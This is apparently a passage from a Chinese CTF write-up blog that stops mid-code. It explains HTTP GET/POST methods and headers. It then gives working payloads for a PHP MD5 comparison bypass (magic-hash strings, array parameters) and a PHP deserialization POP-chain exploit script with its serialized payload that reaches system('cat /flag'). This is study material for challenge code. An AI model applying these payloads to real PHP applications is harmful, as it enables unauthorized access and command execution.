title="基本介绍："></a>基本介绍：</h6><p>GET是常用的HTTP方法，常用于获取服务器的某个资源，以下几种方式都会触发GET方法的请求:</p><p>1、在浏览器中直接输入URL回车或者点击收藏夹中的链接，此时浏览器就会发送出一个GET请求</p><p>2、HTML中的link、img、script等标签的属性中放一个URL，浏览器也会构造出HTTP GET请求</p><p>3、使用Javascript中带你ajax，也能构造出HTTP GET请求</p><p>3、各种编程语言，只要能够访问网络，就能构造出HTTP GET请求</p><h6 id="GET请求特点："><a href="#GET请求特点：" class="headerlink" title="GET请求特点："></a>GET请求特点：</h6><p><font style="color:rgb(51, 51, 51);">1、首行里面第一部分就是GET</font></p><p><font style="color:rgb(51, 51, 51);">2、URL里面的 query string可以是空，也可以不是空</font></p><p><font style="color:rgb(51, 51, 51);">3、GET请求的header有若干个键值对结构</font></p><p><font style="color:rgb(51, 51, 51);">4、GET请求的body一般为空</font></p><h5 id="POST方法："><a href="#POST方法：" class="headerlink" title="POST方法："></a><font style="color:rgb(79, 79, 79);">POST方法：</font></h5><h6 id="基本介绍：-1"><a href="#基本介绍：-1" class="headerlink" title="基本介绍："></a>基本介绍：</h6><p><font style="color:rgb(77, 77, 77);">POST方法也是一种常见的方法，用于提交用户输入的数据给服务器（如登陆界面）</font></p><h6 id="POST请求的特点："><a href="#POST请求的特点：" class="headerlink" title="POST请求的特点："></a><font style="color:rgb(77, 77, 77);">POST请求的特点：</font></h6><p>1、首行第一部分就是POST</p><p>2、URL里面的query string一般是空的</p><p>3、POST请求的header中有若干个键值对</p><p>4、POST请求的body一般不为空（body的具体数据格式，由header中的Content-Type来描述；body的具体数据长度，由header中的Content-Length来描述） </p><h5 id="GET和POST本质的区别："><a href="#GET和POST本质的区别：" class="headerlink" title="GET和POST本质的区别："></a><font style="color:rgb(79, 79, 79);">GET和POST本质的区别：</font></h5><p>GET和POST本质是没有区别的，使用GET的场景完全可以使用POST代替，但是在具体的使用上，还是存在一些细节的区别：</p><p>1、GET习惯上会把客户端的数据通过query string来传输（body是空的）；POST习惯会把客户端数据通过body来传输（query string 是空的）</p><p>2、GET习惯上用于从服务器获取数据，POST习惯上是客户端给服务器提交数据</p><p>3、一般情况下，程序员会把GET请求的处理，是现成幂等的；对于POST请求的处理，不要是现成幂等的</p><p>4、GET请求可以被缓存，可以被浏览器保存到收藏夹中；POST请求不能被缓存</p><h4 id="认识请求报头"><a href="#认识请求报头" class="headerlink" title="认识请求报头"></a><font style="color:rgb(79, 79, 79);">认识请求报头</font></h4><p><font style="color:rgb(77, 77, 77);">header整体格式是键值对结构，每一个键值对占一行，键和值之间使用”冒号+空格“进行分割</font></p><p><font style="color:rgb(77, 77, 77);">下面介绍几种常见的报头：</font></p><h6 id="Host："><a href="#Host：" class="headerlink" title="Host："></a><font style="color:rgb(79, 79, 79);">Host：</font></h6><p><font style="color:rgb(77, 77, 77);">Host的值表示服务器主机的地址和端口（地址可以是域名，也可以是IP；端口号可以省略或者手动指定）</font></p><h6 id="Content-Length："><a href="#Content-Length：" class="headerlink" title="Content-Length："></a><font style="color:rgb(79, 79, 79);">Content-Length：</font></h6><p><font style="color:rgb(77, 77, 77);">Content-Length表示body的数据长度，长度单位是字节 以题目的数据包为例 body数据长度为9个字节</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731395156601-83b518e9-c0d7-4b25-9e44-e8f8f09d66ee.png"></p><h6 id="Content-Type："><a href="#Content-Type：" class="headerlink" title="Content-Type："></a><font style="color:rgb(79, 79, 79);">Content-Type：</font></h6><p><font style="color:rgb(77, 77, 77);">Content-Type表示body的数据格式 常见的数据格式可以参考</font><a href="https://blog.csdn.net/m0_71231013/article/details/125127289?ops_request_misc=%257B%2522request%255Fid%2522%253A%252292F2351D-39D2-45AF-A970-26CA08A8A032%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=92F2351D-39D2-45AF-A970-26CA08A8A032&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-125127289-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=Content-Type%E8%A1%A8%E7%A4%BAbody%E7%9A%84%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F&spm=1018.2226.3001.4187"><font style="color:rgb(77, 77, 77);">链接</font></a></p><h6 id="User-Agent："><a href="#User-Agent：" class="headerlink" title="User-Agent："></a><font style="color:rgb(79, 79, 79);">User-Agent：</font></h6><p><font style="color:rgb(77, 77, 77);">User-Agent表示浏览器或者操作系统的属性，简称UA 形如</font></p><p><font style="color:rgb(77, 77, 77);">Mozilla&#x2F;5.0 (</font><font style="color:rgb(78, 161, 219) !important;">Windows</font><font style="color:rgb(77, 77, 77);"> NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko)Chrome&#x2F;91.0.4472.77 Safari&#x2F;537.36</font></p><p><font style="color:rgb(51, 51, 51);">其中</font></p><p><font style="color:rgb(78, 161, 219) !important;">Windows</font><font style="color:rgb(77, 77, 77);"> NT 10.0; Win64; x64</font><font style="color:rgb(51, 51, 51);"> 表示操作系统信息</font></p><p><font style="color:rgb(77, 77, 77);">AppleWebKit&#x2F;537.36 (KHTML, like Gecko)Chrome&#x2F;91.0.4472.77 Safari&#x2F;537.36</font><font style="color:rgb(51, 51, 51);"> 表示浏览器信息</font></p><h6 id="Referer："><a href="#Referer：" class="headerlink" title="Referer："></a><font style="color:rgb(79, 79, 79);">Referer：</font></h6><p><font style="color:rgb(77, 77, 77);">Referer表示这个页面从哪个页面跳转过来的，这个是一个非常有用的字段</font></p><p><font style="color:rgb(77, 77, 77);">就比如我们在浏览器中搜索蛋糕，这个时候会跳出很多广告，这些广告是某些厂商投到某个浏览器的，当我们用搜狗点击的，搜狗就会获得这个钱，用百度点击百度就会获得，所以我们就可以根据Referer来判断我们上一个网页是百度还是搜狗</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731395708119-8b209d32-d468-47d8-8e8d-b98a66ea7635.png"></p><p><font style="color:rgb(77, 77, 77);">我们对点击广告进行抓包，上面Referer就显示是从搜狗跳转过来的</font></p><p><font style="color:rgb(77, 77, 77);">注意： 如果直接在浏览器中输入 URL 或直接通过收藏夹访问页面时，是没有 Referer 的</font></p><h6 id="Cookie："><a href="#Cookie：" class="headerlink" title="Cookie："></a><font style="color:rgb(79, 79, 79);">Cookie：</font></h6><p>什么是Cookie？</p><p><font style="color:rgb(77, 77, 77);">   Cookie是浏览器提供一种让程序员在本地存储数据的能力</font></p><p><font style="color:rgb(77, 77, 77);">为什么需要cookie？</font></p><p><font style="color:rgb(77, 77, 77);">  如果没有Cookie直接将要存储的数据保存到客户端浏览器所在的主机的硬盘上，就会出现很大的安全风险，比如当你不小心打开一个不安全的网站，该网站就可能在你的硬盘上写一个病毒程序，那么你的电脑可能就GG了！因此浏览器可能为了保证安全性，就会禁止网页中代码访问主机硬盘（无法在JS中读写文件），因此也就失去持久化存储能力，所以Cookie就是为了解决这个问题</font></p><p><font style="color:rgb(77, 77, 77);">Cookie里面存储的是什么？</font></p><p>  <font style="color:rgb(77, 77, 77);">Cookie中存储的是一个字符串，是键值对结构的，键值对之间使用 ；尽心分割，键和值之间使用&#x3D;进行分割</font></p><h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730776723308-4afebe20-1728-4fa9-b477-a049aa2618ac.png"></p><p>php代码审计以get方式传入参数name name2 以post方式分别传入参数 password password2</p><p>进行两轮验证 验证成功后输出flag</p><p>第一轮：name!&#x3D;password 并且两参数md5加密后弱比较</p><p>第二轮：namw2!&#x3D;password2 并且两参数md5加密后强比较</p><h3 id="弱比较："><a href="#弱比较：" class="headerlink" title="弱比较："></a>弱比较：</h3><p>分为”与字符串类型比较“和”与int类型比较“</p><p>举例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">var_dump(“123a”==123)  //与int类型比较      结果为true<br>var_dump(“123a”==“123”) //与字符串类型比较    结果为false<br></code></pre></td></tr></table></figure><h4 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a><font style="color:rgb(79, 79, 79);">字符串与int类型比较:</font></h4><p><font style="color:rgb(77, 77, 77);">PHP规定当进行“字符串与数字的若比较时”，会进行如下步骤：</font></p><p><font style="color:rgb(77, 77, 77);">先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即”123abc456”&#x3D;&gt;123</font></p><p><font style="color:rgb(77, 77, 77);">如果开头不为数字，则判断为false，即0。因此</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">(&quot;aaa123&quot;==0) =&gt;true<br>(&quot;123a&quot;==123) =&gt;true<br></code></pre></td></tr></table></figure><p>思维导图：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730788948037-043325d4-79b5-456a-987f-05a102f586c9.png"></p><h4 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a><font style="color:rgb(79, 79, 79);">字符串与字符串比较：</font></h4><p><font style="color:rgb(77, 77, 77);">因为这个是字符串之间进行比较，想要绕过这个弱比较只能用</font><font style="color:#DF2A3F;background-color:#FBDE28;">0e</font><font style="color:rgb(77, 77, 77);">的方式。</font></p><p><font style="color:rgb(77, 77, 77);">在PHP中”0e”判断为科学计数法，0e123就是0乘以10的123次方</font></p><p><font style="color:rgb(77, 77, 77);">不难推出：</font><font style="color:rgb(77, 77, 77);background-color:#FBDE28;">0e123456789&#x3D;&#x3D;0e1</font></p><p><font style="color:rgb(77, 77, 77);">不过有一个注意点：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">“0e123456”==“0e345” //True   <br>“0e12adfc”==“0e345” //False<br>在0e后面不能含有字母！！！ 否则判断为False<br></code></pre></td></tr></table></figure><p>弱比较可以使用数组或是以下md5后开头为0e的字符串任意两个来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>0e215962017<br></code></pre></td></tr></table></figure><h3 id="强比较："><a href="#强比较：" class="headerlink" title="强比较："></a>强比较：</h3><p>如果遇到的是强比较最常见的绕过方法是<font style="background-color:#FBDE28;">数组绕过</font> <font style="background-color:#FFFFFF;">（弱比较也能用）</font></p><p><font style="color:rgb(77, 77, 77);">因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。</font></p><p><font style="color:rgb(77, 77, 77);">所以题目payload：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">/?name=QNKCDZO&amp;name2[]=1<br>password=240610708&amp;password2[]=2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730820572218-81ce14b4-6df8-476d-8b6e-490b5ef56306.png"></p><p>本文中的知识点参考<a href="https://blog.csdn.net/ma15848235278/article/details/134006134?ops_request_misc=&request_id=&biz_id=102&utm_term=md5%E5%8A%A0%E5%AF%86%E5%BC%B1%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E6%AF%94%E8%BE%83%E7%9A%84%E6%A6%82%E5%BF%B5%E2%80%99&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-134006134.142%5Ev100%5Epc_search_result_base7&spm=1018.2226.3001.4187">链接</a></p><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="EZ-ser"><a href="#EZ-ser" class="headerlink" title="EZ_ser"></a>EZ_ser</h2><p>说是简单的反序列化 但是感觉不是很简单</p><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;什么，你竟敢不认可?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>web 类为⼊⼝，echo 触发 re 类的 __toString()，通过 $this-&gt;chu0-&gt;$nononono 触 发 pwn 类的 __get()，再通过 $this-&gt;over-&gt;getflag() 执⾏ Misc 类的 getflag() 函数，从⽽得到 flag。</p><p>这里的_toString()需要所在的对象看做字符串才可触发，_get()触发条件是 试图访问一个对象中不可访问或者不存在的属性</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">// 当对象被当做字符串时自动调用（找echo $this-&gt;a这种、strtolower()等）</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;  <span class="hljs-comment">// 2 pwn</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">// wakeup 在反序列化时会自己触发的，也就是链头了</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;  <span class="hljs-comment">// 3 re</span><br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;   <span class="hljs-comment">// 调用类中不存在变量时触发（找有连续箭头的 this-&gt;a-&gt;b）</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;什么，你竟敢不认可?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();  <span class="hljs-comment">// 1 Misc</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Misc</span>();<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pwn</span>();<br><span class="hljs-variable">$p</span>-&gt;over = <span class="hljs-variable">$m</span>;<br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">re</span>();<br><span class="hljs-variable">$r</span>-&gt;chu0 = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable">$w</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$w</span>-&gt;kw = <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>);<br> <br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ser=O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;kw&quot;</span>;O:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;re&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;chu0&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;pwn&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dusk&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;over&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Misc&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;nothing&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;N;&#125;&#125;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;dt&quot;</span>;N;&#125;ALL Done!<br></code></pre></td></tr></table></figure><p>GET上传得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731736638945-a96b7bee-b2cc-439f-abfe-7bd052869456.png"></p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><font style="color:rgb(79, 79, 79);">反序列化</font></h4><p>参考文章<a href="https://blog.csdn.net/m0_73185293/article/details/131353031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522B7E564A8-AB7D-4480-9B2C-91AE97CD4A96%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=B7E564A8-AB7D-4480-9B2C-91AE97CD4A96&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131353031-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">链接</a></p><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a><font style="color:rgb(79, 79, 79);">概述</font></h5><p>反序列化是将序列化得到的字符串转化为一个对象的过程；</p><p> 反序列化生成的对象的成员属性值由被反序列化的字符串决定，与原来类预定义的值无关；</p><p>反序列化使用unserialize()函数将字符串转换为对象，序列化使用serialize()函数将对象转化为字符串；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-number">123</span>;<br>&#125;<br> <br><span class="hljs-variable">$ha</span>=<span class="hljs-string">&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;666&quot;;s:1:&quot;b&quot;;i:6666;&#125;&#x27;</span>;<br><span class="hljs-variable">$ha</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ha</span>)<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ha</span>);<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//输出：</span><br><span class="hljs-keyword">object</span>(test)<span class="hljs-comment">#1 (2) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;666&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">6666</span>)<br>&#125;<br> <br> <br><span 